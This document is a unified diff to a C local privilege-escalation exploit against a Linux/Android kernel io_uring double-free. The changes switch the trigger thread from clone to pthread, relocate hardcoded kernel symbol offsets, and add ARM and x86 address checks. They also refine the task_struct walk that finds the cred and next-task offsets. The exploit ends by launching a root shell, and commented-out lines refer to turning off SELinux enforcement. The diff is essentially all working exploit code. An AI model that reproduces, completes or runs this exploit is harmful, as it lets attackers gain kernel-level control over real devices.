@@ -511,7 +511,7 @@ typedef struct {
 
 Context context = { 0 };
 
-int trigger_thread(void *arg) {
+void *trigger_thread(void *arg) {
   pin_to_cpu(0);
   
   SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
@@ -538,7 +538,7 @@ int trigger_thread(void *arg) {
   SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
   // after trigger barrier hit, exit thread which triggers double free of io_uring context in current task
 
-  return 0;
+  return NULL;
 }
 
 void setup_bug() {
@@ -561,26 +561,7 @@ void setup_bug() {
   context.io_uring = io_uring_setup();
 
   // spawn other thread before allocating io uring stuff
-  //pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);
-  const int STACK_SIZE = 1024 * 1024;
-  char *stack = malloc(STACK_SIZE);
-  if (!stack) {
-      perror("malloc");
-      exit(EXIT_FAILURE);
-  }
-
-  // Flags: share files, separate memory
-  int flags = CLONE_FILES | SIGCHLD;
-
-  pid_t pid = clone(trigger_thread, stack + STACK_SIZE, flags, NULL);
-  if (pid == -1) {
-      perror("clone");
-      free(stack);
-      exit(EXIT_FAILURE);
-  }
-
-  printf("Parent: created child with PID %d\n", pid);
-  context.pid = pid;
+  pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);
 
   // have other thread submit read
   SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
@@ -606,8 +587,7 @@ void setup_bug() {
 void trigger_bug() {
   io_uring_enter_poll(&context.io_uring, 2);
   SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
-  waitpid(context.pid, NULL, 0);
-  printf("Other pid exited\n");
+  pthread_join(context.trigger_thread, NULL);
 }
 
 void trigger_process(int start_step_pipes[2], int end_step_pipes[2]) {
@@ -710,23 +690,30 @@ usize vmem_base = 0;
 usize kaslr_base = 0;
 usize phys_base = 0;
 
+
+#define KERNEL_BASE 0xffffffff81000000
+#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
+
 #ifdef ARM
 
-// arm implementation
-unsigned long page_address(unsigned long page) {
-  unsigned long addr = ((page << 6) + 0xffffc008000000ul) | 0xffff000000000000;
-  // printf("page %lx to addr %lx\n", page, addr);
-  return addr;
+#define SHELL "/system/bin/sh"
+
+usize addr_to_page(usize addr) {
+  return ((addr >> 12) << 6) + vmem_base;
 }
 
-unsigned long addr_to_page(unsigned long addr) {
-  addr = addr & 0xfffffffffffff000ul;
-  unsigned long page = ((addr - 0xffffc008000000ul) >> 6);
-  // printf("addr %lx to page %lx\n", addr, page);
-  return page;
+usize is_linear_address(usize addr) {
+  return (addr & 0xffff000000000000) == 0xffff000000000000;
+}
+
+usize is_kernel_address(usize addr) {
+  return (addr & 0xffffffff80000000) == 0xffffffff80000000;
 }
 
 #else
+
+#define SHELL "/bin/bash"
 
 usize addr_to_page(usize addr) {
   return ((addr >> 12) << 6) + vmem_base;
@@ -848,10 +835,6 @@ void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
     write64(addr+i*8, data[i]);
   }
 }
-
-#define KERNEL_BASE 0xffffffff81000000
-#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
-#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
 
 void exploit() {
   int start_step_pipes[2] = { 0 };
@@ -1068,16 +1051,16 @@ void exploit() {
     usize value2 = read64_kernel(current_task + i + 8);
     // check for 'swapper/' string
     if (value == 0x2f72657070617773) {
-      comm_offset = i;\
+      comm_offset = i;
       cred_offset = comm_offset - 0x10;
       printf("comm offset: %lx\n", comm_offset);
     }
 
-    if (is_linear_address(value) && is_linear_address(value2)) {
+    if (is_linear_address(value) && !is_kernel_address(value) && is_linear_address(value2) && !is_kernel_address(value2) && next_task_offset == 0) {
       // printf("%lx, %lx\n", value, value2);
       usize prev_ptr = read64_all(value + 8);
       // printf("prev: %lx\n", prev_ptr);
-      if (prev_ptr == current_task + i && value % 128 == i % 128) {
+      if (prev_ptr == current_task + i) {
         next_task_offset = i;
         printf("next task offset: %lx\n", next_task_offset);
       }
@@ -1120,42 +1103,11 @@ void exploit() {
   // selinux_state += kaslr_offset;
   // // enforing is 1 byte, writing 8 bytes overwrites others
   // write64(selinux_state - 7, 0);
-  system("/bin/sh");
+  system(SHELL);
 
   while (1) {
     sleep(1000);
   }
-
-  // getchar();
-
-  // for (next_task_offset = 0; next_task_offset < 4096; next_task_offset += 8) {
-  //   printf("offset: %lx\n", next_task_offset);
-  //   current_task = INIT_OFFSET + kaslr_base;
-  //   usize counter = 0;
-  //   for (;;) {
-  //     usize new_task = read64_kernel(current_task + next_task_offset) - next_task_offset;
-  //     printf("new task: %lx\n", new_task);
-  //     if (new_task == current_task || !is_linear_address(new_task) || counter > 8 || new_task > 0xfffffffffff00000 || new_task % 8 != 0) {
-  //       //printf("failed to find new task\n");
-  //       break;
-  //       // getchar();
-  //       // panic("done");
-  //     }
-  //     current_task = new_task;
-  //     counter += 1;
-
-  //     unsigned long name[2] = { 0 };
-  //     name[0] = read64_kernel(current_task + comm_offset);
-  //     printf("%s\n", name);
-
-  //     if (!strcmp((char *)name, "expp")) {
-  //       printf("we found the process at %lx\n", current_task);
-  //       break;
-  //     }
-  //   }
-  // }
-
-  getchar();
 }
 
 int main() {
